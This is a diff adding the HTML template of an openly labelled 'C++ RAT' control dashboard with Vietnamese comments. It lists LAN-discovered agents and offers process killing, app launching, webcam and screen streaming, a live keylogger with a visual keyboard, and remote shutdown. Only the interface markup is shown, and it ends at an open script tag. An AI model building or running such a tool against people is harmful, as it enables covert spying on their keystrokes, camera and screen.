@@ -1,0 +1,576 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>AdminLTE RAT Dashboard</title>
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
+    
+    <style>
+        .wrapper { min-height: 100vh; }
+        .content-header { padding: 15px 0.5rem; }
+        #live_feed, #screenImg { max-width: 100%; height: auto; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .table-responsive { max-height: 500px; overflow-y: auto; }
+        textarea.console { font-family: monospace; font-size: 0.9rem; background-color: #1e1e1e; color: #00ff00; }
+
+        /* --- KEYBOARD STYLES (New Layout) --- */
+        .keyboard-base {
+            background-color: transparent; /* Nền trong suốt */
+            padding: 20px;
+            border-radius: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            user-select: none;
+            border: none; 
+            max-width: 1100px; /* Tăng chiều rộng để chứa đủ phím */
+            margin: 0 auto;
+            backdrop-filter: blur(5px); /* Hiệu ứng mờ nền web phía sau */
+            -webkit-backdrop-filter: blur(5px);
+            overflow-x: auto; /* Cuộn ngang nếu màn hình nhỏ */
+        }
+
+        .key-row {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            min-width: 900px; /* Đảm bảo không bị vỡ layout */
+        }
+
+        .key {
+            background-color: #000000; /* Phím đen */
+            color: #ffffff; /* Chữ trắng */
+            border-radius: 6px;
+            height: 45px;
+            width: 45px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: 600;
+            font-size: 13px;
+            border: 1px solid #333333; /* Viền xám mờ */
+            transition: all 0.05s ease-in-out;
+            cursor: default;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
+            text-transform: uppercase;
+        }
+
+        /* Kích thước phím đặc biệt */
+        .key.wide-1 { width: 65px; }
+        .key.wide-2 { width: 85px; }
+        .key.wide-3 { width: 105px; }
+        .key.space { width: 320px; }
+        .key.enter-iso { width: 90px; border-radius: 6px; } 
+        .key.numpad-0 { width: 96px; }
+        
+        /* Khoảng cách giữa các cụm phím */
+        .gap-small { margin-left: 20px; }
+        .gap-medium { margin-left: 40px; }
+
+        /* --- ACTIVE STATE (Cyan Neon Effect) --- */
+        .key.active {
+            background-color: #00ffff !important; /* Nền Cyan */
+            color: #000000 !important; /* Chữ đen */
+            border-color: #00ffff !important;
+            transform: translateY(2px);
+            box-shadow: 0 0 15px #00ffff, 0 0 30px #00ffff; /* Phát sáng */
+            font-weight: 800;
+        }
+
+        /* Ẩn text phụ của icon */
+        .key i + span { display: none; }
+        
+        /* Cụm mũi tên dọc */
+        .arrow-cluster {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+    </style>
+</head>
+
+<body class="hold-transition sidebar-mini layout-fixed">
+<div class="wrapper">
+
+    <nav class="main-header navbar navbar-expand navbar-white navbar-light">
+        <ul class="navbar-nav">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
+            </li>
+            <li class="nav-item d-none d-sm-inline-block">
+                <span class="nav-link font-weight-bold">Control Panel</span>
+            </li>
+        </ul>
+        <ul class="navbar-nav ml-auto">
+            <li class="nav-item">
+                <span id="global_status" class="badge badge-danger p-2">Disconnected</span>
+            </li>
+        </ul>
+    </nav>
+    
+    <aside class="main-sidebar sidebar-dark-primary elevation-4">
+        <a href="#" class="brand-link">
+            <span class="brand-text font-weight-light ml-3">C++ RAT Monitor</span>
+        </a>
+
+        <div class="sidebar">
+            <nav class="mt-2">
+                <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu">
+                    
+                    <li class="nav-item">
+                        <a href="#tab-connect" class="nav-link active" data-toggle="tab">
+                            <i class="nav-icon fas fa-network-wired"></i>
+                            <p>Connection</p>
+                        </a>
+                    </li>
+
+                    <li class="nav-item">
+                        <a href="#tab-process" class="nav-link" data-toggle="tab">
+                            <i class="nav-icon fas fa-microchip"></i>
+                            <p>Processes</p>
+                        </a>
+                    </li>
+
+                    <li class="nav-item">
+                        <a href="#tab-apps" class="nav-link" data-toggle="tab">
+                            <i class="nav-icon fas fa-box-open"></i>
+                            <p>Installed Apps</p>
+                        </a>
+                    </li>
+                    
+                    <li class="nav-item">
+                        <a href="#tab-monitor" class="nav-link" data-toggle="tab">
+                            <i class="nav-icon fas fa-video"></i>
+                            <p>Live Monitor</p>
+                        </a>
+                    </li>
+                    
+                    <li class="nav-item">
+                        <a href="#tab-keylog" class="nav-link" data-toggle="tab">
+                            <i class="nav-icon fas fa-keyboard"></i>
+                            <p>Keylogger</p>
+                        </a>
+                    </li>
+
+                    <li class="nav-item">
+                        <a href="#tab-system" class="nav-link" data-toggle="tab">
+                            <i class="nav-icon fas fa-cogs"></i>
+                            <p>System Control</p>
+                        </a>
+                    </li>
+
+                </ul>
+            </nav>
+        </div>
+    </aside>
+
+    <div class="content-wrapper">
+        <div class="content-header">
+            <div class="container-fluid"></div>
+        </div>
+
+        <div class="content">
+            <div class="container-fluid">
+                <div class="tab-content">
+
+                    <div class="tab-pane fade show active" id="tab-connect">
+                        <div class="card card-primary card-outline">
+                            <div class="card-header">
+                                <h3 class="card-title"><i class="fas fa-plug"></i> Trạng thái Kết nối</h3>
+                            </div>
+                            <div class="card-body">
+                                <div class="row"> 
+                                    <div class="col-md-4">
+                                        <label>Target IP</label>
+                                        <input type="text" class="form-control" id="agent_ip" value="{{ agent_ip }}">
+                                    </div>
+                                    <div class="col-md-3">
+                                        <label>Port</label>
+                                        <input type="number" class="form-control" id="agent_port" value="{{ agent_port }}">
+                                    </div>
+                                    <div class="col-md-3 d-flex align-items-end">
+                                        <button class="btn btn-primary w-100" onclick="connectAgent()">
+                                            <i class="fas fa-link"></i> Connect Agent
+                                        </button>
+                                    </div>
+                                    <div class="col-md-2 d-flex align-items-end">
+                                        <div id="connection_msg" class="text-muted font-weight-bold">Ready</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card card-purple">
+                            <div class="card-header">
+                                <h3 class="card-title"><i class="fas fa-satellite-dish"></i> Thiết bị Tự động Phát hiện (UDP)</h3>
+                                <div class="card-tools">
+                                    <button class="btn btn-tool" onclick="clearDiscoveryTable()"><i class="fas fa-trash"></i> Clear</button>
+                                </div>
+                            </div>
+                            <div class="card-body p-0">
+                                <div class="p-3 text-muted font-italic">
+                                    <i class="fas fa-info-circle"></i> Hệ thống đang tự động lắng nghe tín hiệu từ Agent C++ trong mạng LAN...
+                                </div>
+                                
+                                <table id="discovery_table" class="table table-striped table-hover">
+                                    <thead>
+                                        <tr>
+                                            <th>IP Address</th>
+                                            <th>Hostname</th>
+                                            <th>Method</th>
+                                            <th>Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr id="empty_row"><td colspan="4" class="text-center text-muted">Đang chờ tín hiệu (Vui lòng bật Agent C++)...</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tab-pane fade" id="tab-process">
+                        <div class="row">
+                            <div class="col-lg-8">
+                                <div class="card card-success card-outline">
+                                    <div class="card-header">
+                                        <h3 class="card-title">Task Manager (Running Processes)</h3>
+                                        <div class="card-tools">
+                                            <button class="btn btn-tool" onclick="sendCommand('TASK_LIST')"><i class="fas fa-sync-alt"></i> Refresh</button>
+                                        </div>
+                                    </div>
+                                    <div class="card-body p-0 table-responsive" style="height: 500px;">
+                                        <table id="process_table" class="table table-head-fixed text-nowrap table-striped table-sm">
+                                            <thead>
+                                                <tr><th>PID</th><th>Process Name</th><th>Action</th></tr>
+                                            </thead>
+                                            <tbody></tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-4">
+                                <div class="card card-warning">
+                                    <div class="card-header"><h3 class="card-title">Quick Control</h3></div>
+                                    <div class="card-body">
+                                        <div class="form-group">
+                                            <label><i class="fas fa-skull"></i> Kill Process</label>
+                                            <div class="input-group">
+                                                <input type="text" class="form-control" id="pid_kill" placeholder="PID (vd: 1234)">
+                                                <div class="input-group-append">
+                                                    <button class="btn btn-danger" onclick="killProcess()">Kill</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <hr>
+
+                                        <div class="form-group">
+                                            <label><i class="fas fa-play"></i> Quick Run / Start App</label>
+                                            <div class="input-group">
+                                                <input type="text" class="form-control" id="app_start" placeholder="Tên App (vd: calc.exe, cmd)">
+                                                <div class="input-group-append">
+                                                    <button class="btn btn-success" onclick="startAppInput()">Start</button>
+                                                </div>
+                                            </div>
+                                            <small class="text-muted">Nhập tên exe hoặc đường dẫn đầy đủ.</small>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tab-pane fade" id="tab-apps">
+                        <div class="card card-info card-outline">
+                            <div class="card-header">
+                                <h3 class="card-title"><i class="fas fa-box-open"></i> Installed Applications Manager</h3>
+                                <div class="card-tools">
+                                    <button class="btn btn-info btn-sm" onclick="sendCommand('APP_LIST')">
+                                        <i class="fas fa-sync"></i> Scan Installed Apps
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="card-body p-0 table-responsive" style="height: 600px;">
+                                <table id="app_table" class="table table-head-fixed text-nowrap table-striped table-hover">
+                                    <thead>
+                                        <tr>
+                                            <th>Application Name</th>
+                                            <th style="width: 40%">Executable Path</th>
+                                            <th>Status</th>
+                                            <th>Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr><td colspan="4" class="text-center text-muted">Nhấn nút "Scan Installed Apps" để lấy dữ liệu...</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tab-pane fade" id="tab-monitor">
+                        <div class="card card-dark">
+                            <div class="card-header d-flex justify-content-between align-items-center">
+                                <h3 class="card-title">Remote Viewer</h3>
+                                <div class="ml-auto">
+                                    <div class="btn-group mr-2">
+                                        <button class="btn btn-success btn-sm" onclick="sendCommand('CMD_OPEN_CAM')"><i class="fas fa-video"></i> Camera</button>
+                                        <button class="btn btn-danger btn-sm" onclick="sendCommand('CMD_CLOSE_CAM')"><i class="fas fa-times"></i></button>
+                                    </div>
+
+                                    <div class="btn-group mr-2">
+                                        <button class="btn btn-info btn-sm" onclick="sendCommand('CMD_OPEN_SCREEN')"><i class="fas fa-desktop"></i> Screen Stream</button>
+                                        <button class="btn btn-danger btn-sm" onclick="sendCommand('CMD_CLOSE_SCREEN')"><i class="fas fa-times"></i></button>
+                                    </div>
+
+                                    <button class="btn btn-primary btn-sm" onclick="sendCommand('CMD_SCREENSHOT')"><i class="fas fa-camera"></i> Snap</button>
+                                </div>
+                            </div>
+                            <div class="card-body text-center bg-dark p-1">
+                                <img id="live_feed" src="" alt="Waiting for stream..." style="width: 100%; height: auto;">
+                            </div>
+                        </div>
+                    </div>
+
+                   <div class="tab-pane fade" id="tab-keylog">
+                        <div class="row">
+                            <div class="col-lg-12 mb-3">
+                                <div class="card card-secondary">
+                                    <div class="card-header d-flex justify-content-between align-items-center">
+                                        <h3 class="card-title"><i class="fas fa-keyboard"></i> Live Keylogger Stream</h3>
+                                        <div>
+                                                <button id="btnKeylogToggle" class="btn btn-warning btn-sm" onclick="toggleKeylogger()">
+                                                <i class="fas fa-play"></i> Start
+                                            </button>
+                                            <button class="btn btn-default btn-sm" onclick="clearKeylog()">
+                                                <i class="fas fa-eraser"></i> Clear
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="card-body">
+                                        <textarea id="txtKeylogs" class="form-control console" rows="5" placeholder="Dữ liệu phím gõ sẽ hiện ở đây..." readonly></textarea>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-12">
+                                <div class="card card-dark" style="background-color: transparent; box-shadow: none;">
+                                    <div class="card-header border-0">
+                                        <h3 class="card-title">Visual Keyboard Monitor</h3>
+                                    </div>
+                                    <div class="card-body d-flex justify-content-center" style="background-color: transparent;">
+                    
+                                        <div class="keyboard-base" id="visual_keyboard">
+                                            <div class="key-row">
+                                                <div class="key" data-key="ESC">Esc</div>
+                                                <div class="key gap-small" data-key="F1">F1</div>
+                                                <div class="key" data-key="F2">F2</div>
+                                                <div class="key" data-key="F3">F3</div>
+                                                <div class="key" data-key="F4">F4</div>
+                                                <div class="key gap-small" data-key="F5">F5</div>
+                                                <div class="key" data-key="F6">F6</div>
+                                                <div class="key" data-key="F7">F7</div>
+                                                <div class="key" data-key="F8">F8</div>
+                                                <div class="key gap-small" data-key="F9">F9</div>
+                                                <div class="key" data-key="F10">F10</div>
+                                                <div class="key" data-key="F11">F11</div>
+                                                <div class="key" data-key="F12">F12</div>
+                                                <div class="key gap-small" data-key="PRTSC">Prt</div>
+                                                <div class="key" data-key="SCRLK">Scr</div>
+                                                <div class="key" data-key="PAUSE">Pus</div>
+                                            </div>
+                        
+                                            <div class="key-row">
+                                                <div class="key" data-key="`">~</div>
+                                                <div class="key" data-key="1">1</div>
+                                                <div class="key" data-key="2">2</div>
+                                                <div class="key" data-key="3">3</div>
+                                                <div class="key" data-key="4">4</div>
+                                                <div class="key" data-key="5">5</div>
+                                                <div class="key" data-key="6">6</div>
+                                                <div class="key" data-key="7">7</div>
+                                                <div class="key" data-key="8">8</div>
+                                                <div class="key" data-key="9">9</div>
+                                                <div class="key" data-key="0">0</div>
+                                                <div class="key" data-key="-">-</div>
+                                                <div class="key" data-key="=">=</div>
+                                                <div class="key wide-2" data-key="BACKSPACE"><i class="fas fa-backspace"></i></div>
+                                                <div class="key gap-small" data-key="HOME">Hm</div>
+                                                <div class="key gap-small" data-key="NUMLOCK">Num</div>
+                                                <div class="key" data-key="NUM_DIVIDE">/</div>
+                                                <div class="key" data-key="NUM_MULTIPLY">*</div>
+                                            </div>
+                        
+                                            <div class="key-row">
+                                                <div class="key wide-1" data-key="TAB">Tab</div>
+                                                <div class="key" data-key="Q">Q</div>
+                                                <div class="key" data-key="W">W</div>
+                                                <div class="key" data-key="E">E</div>
+                                                <div class="key" data-key="R">R</div>
+                                                <div class="key" data-key="T">T</div>
+                                                <div class="key" data-key="Y">Y</div>
+                                                <div class="key" data-key="U">U</div>
+                                                <div class="key" data-key="I">I</div>
+                                                <div class="key" data-key="O">O</div>
+                                                <div class="key" data-key="P">P</div>
+                                                <div class="key" data-key="[">[</div>
+                                                <div class="key" data-key="]">]</div>
+                                                <div class="key wide-1" data-key="\">\|</div>
+                                                <div class="key gap-small" data-key="PAGEUP">Pup</div>
+                                                <div class="key gap-small" data-key="NUM_7">7</div>
+                                                <div class="key" data-key="NUM_8">8</div>
+                                                <div class="key" data-key="NUM_9">9</div>
+                                            </div>
+
+                                            <div class="key-row">
+                                                <div class="key wide-2" data-key="CAPSLOCK">Caps</div>
+                                                <div class="key" data-key="A">A</div>
+                                                <div class="key" data-key="S">S</div>
+                                                <div class="key" data-key="D">D</div>
+                                                <div class="key" data-key="F">F</div>
+                                                <div class="key" data-key="G">G</div>
+                                                <div class="key" data-key="H">H</div>
+                                                <div class="key" data-key="J">J</div>
+                                                <div class="key" data-key="K">K</div>
+                                                <div class="key" data-key="L">L</div>
+                                                <div class="key" data-key=";">;</div>
+                                                <div class="key" data-key="'">'</div>
+                                                <div class="key enter-iso" data-key="ENTER">Enter</div>
+                                                <div class="key gap-small" data-key="PAGEDOWN">Pdn</div>
+                                                <div class="key gap-small" data-key="NUM_4">4</div>
+                                                <div class="key" data-key="NUM_5">5</div>
+                                                <div class="key" data-key="NUM_6">6</div>
+                                            </div>
+                        
+                                            <div class="key-row">
+                                                <div class="key wide-3" data-key="LSHIFT">Shift</div>
+                                                <div class="key" data-key="Z">Z</div>
+                                                <div class="key" data-key="X">X</div>
+                                                <div class="key" data-key="C">C</div>
+                                                <div class="key" data-key="V">V</div>
+                                                <div class="key" data-key="B">B</div>
+                                                <div class="key" data-key="N">N</div>
+                                                <div class="key" data-key="M">M</div>
+                                                <div class="key" data-key=",">,</div>
+                                                <div class="key" data-key=".">.</div>
+                                                <div class="key" data-key="/">/</div>
+                                                <div class="key wide-2" data-key="RSHIFT">Shift</div>
+                                                <div class="key gap-small" data-key="END">End</div>
+                                                <div class="key gap-small" data-key="NUM_1">1</div>
+                                                <div class="key" data-key="NUM_2">2</div>
+                                                <div class="key" data-key="NUM_3">3</div>
+                                            </div>
+
+                                            <div class="key-row">
+                                                <div class="key wide-1" data-key="LCTRL">Ctrl</div>
+                                                <div class="key" data-key="WIN"><i class="fab fa-windows"></i></div>
+                                                <div class="key wide-1" data-key="LALT">Alt</div>
+                                                <div class="key space" data-key="SPACE"></div>
+                                                <div class="key wide-1" data-key="RALT">Alt</div>
+                                                <div class="key" data-key="FN">Fn</div>
+                                                <div class="key" data-key="MENU"><i class="fas fa-bars"></i></div>
+                                                <div class="key wide-1" data-key="RCTRL">Ctrl</div>
+                            
+                                                <div class="arrow-cluster gap-small">
+                                                    <div class="key-row" style="min-width: unset;">
+                                                        <div class="key" style="visibility: hidden;"></div>
+                                                        <div class="key" data-key="UP"><i class="fas fa-caret-up"></i></div>
+                                                        <div class="key" style="visibility: hidden;"></div>
+                                                    </div>
+                                                    <div class="key-row" style="min-width: unset;">
+                                                        <div class="key" data-key="LEFT"><i class="fas fa-caret-left"></i></div>
+                                                        <div class="key" data-key="DOWN"><i class="fas fa-caret-down"></i></div>
+                                                        <div class="key" data-key="RIGHT"><i class="fas fa-caret-right"></i></div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="key numpad-0 gap-small" data-key="NUM_0">0</div>
+                                                <div class="key" data-key="NUM_DECIMAL">.</div>
+                                            </div>
+                                        </div>
+                                        </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="tab-pane fade" id="tab-system">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="card card-danger card-outline">
+                                    <div class="card-header">
+                                        <h3 class="card-title"><i class="fas fa-power-off"></i> Power Management</h3>
+                                    </div>
+                                    <div class="card-body">
+                                        <p class="text-muted">Các hành động dưới đây sẽ can thiệp trực tiếp vào máy trạm. Hãy cẩn thận.</p>
+                                        
+                                        <button class="btn btn-app bg-danger" onclick="confirmAction('CMD_SHUTDOWN')">
+                                            <i class="fas fa-power-off"></i> Shutdown
+                                        </button>
+                                        
+                                        <button class="btn btn-app bg-warning" onclick="confirmAction('CMD_RESTART')">
+                                            <i class="fas fa-sync"></i> Restart
+                                        </button>
+                                        
+                                        <button class="btn btn-app bg-secondary" onclick="sendCommand('CMD_LOCK')">
+                                            <i class="fas fa-lock"></i> Lock Screen
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-md-6">
+                                <div class="card card-primary card-outline">
+                                    <div class="card-header">
+                                        <h3 class="card-title"><i class="fas fa-info-circle"></i> Host Information</h3>
+                                    </div>
+                                    <div class="card-body box-profile">
+                                        <div class="text-center">
+                                            <img class="profile-user-img img-fluid img-circle"
+                                                 src="https://cdn-icons-png.flaticon.com/512/900/900618.png"
+                                                 alt="User profile picture">
+                                        </div>
+
+                                        <h3 class="profile-username text-center" id="sys_hostname">Target Machine</h3>
+                                        <p class="text-muted text-center" id="sys_ip">IP: {{ agent_ip }}</p>
+
+                                        <ul class="list-group list-group-unbordered mb-3">
+                                            <li class="list-group-item">
+                                                 <b>OS</b> <a class="float-right text-muted">Windows 10/11</a>
+                                            </li>
+                                            <li class="list-group-item">
+                                                <b>Status</b> <a class="float-right text-success">Online</a>
+                                            </li>
+                                            <li class="list-group-item">
+                                                <b>Privilege</b> <a class="float-right text-danger">Administrator</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div> 
+            </div>
+        </div>
+    </div>
+
+    <footer class="main-footer text-sm">
+        <div class="float-right d-none d-sm-inline">v3.1 Full Features</div>
+        <strong>C++ RAT Dashboard</strong>
+    </footer>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<script src="{{ url_for('static', filename='app.js') }}"></script>
+
+<script>
